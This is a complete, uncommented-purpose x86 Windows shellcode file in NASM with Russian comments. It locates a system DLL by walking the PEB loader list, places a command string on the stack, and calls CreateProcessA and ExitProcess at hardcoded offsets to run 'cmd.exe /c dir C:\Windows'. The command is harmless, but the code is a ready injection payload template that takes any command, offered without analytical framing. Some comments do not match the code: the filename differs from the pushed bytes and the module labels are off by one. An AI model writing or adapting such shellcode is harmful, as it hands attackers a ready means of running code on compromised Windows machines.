[BITS 32]

section .text
    global _start

_start:
    ; Получение PEB через TEB (Thread Environment Block)
    xor eax, eax
    add al, 0x10              ; EAX = 0x10 (смещение к PEB в TEB)
    mov ecx, dword [fs:eax+0x20] ; PEB
    mov eax, dword [fs:eax+0x20] ; PEB
    mov eax, dword [eax+0x0c] ; PEB->Ldr
    mov eax, dword [eax+0x14] ; Ldr->InMemoryOrderModuleList
    mov edx, dword [eax]      ; Первый модуль (ntdll.dll)
    mov eax, edx
    mov edx, dword [eax]      ; Второй модуль (kernel32.dll)
    mov eax, edx
    mov eax, dword [eax+0x10] ; kernel32.dll base address
    mov edi, eax

    ; "cmd.exe /c dir c:\\Windows > output.txt"
    xor edx, edx
    push edx
    xor ecx, ecx
    push 0x7478742e
    push 0x3174756f
    push 0x203e2073
    push 0x776f646e
    push 0x69575c3a
    push 0x43207269
    push 0x6420632f
    push 0x20657865
    push 0x2e646d63
    mov ecx, esp

    ; STARTUPINFO
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push 68                   ; cb = sizeof(STARTUPINFO) = 68 bytes
    mov eax, esp

    ; PROCESS_INFORMATION
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    push edx                  ; NULL
    mov ebx, esp

    ; Подготовка аргументов для CreateProcess
    push ebx                  ; lpProcessInformation
    push eax                  ; lpStartupInfo
    push edx                  ; lpCurrentDirectory = NULL
    push edx                  ; lpEnvironment = NULL
    push edx                  ; dwCreationFlags = 0
    push edx                  ; bInheritHandles = FALSE
    push edx                  ; lpThreadAttributes = NULL
    push edx                  ; lpProcessAttributes = NULL
    push ecx                  ; lpCommandLine
    push edx                  ; lpApplicationName = NULL


    ; CreateProcessA
    mov eax, edi               ; kernel32.dll
    xor esi, esi
    mov si, 0b0110101000101010 ; 0x00035150 / 8
    shl esi,3
    add eax,esi
    call eax
    mov ebx,eax

    ; ExitProcess
    mov eax, edi               ; kernel32.dll
    xor esi, esi
    mov si, 0b1001101010001000 ; 0x00026A20 / 4
    shl esi,2
    add eax,esi
    call eax


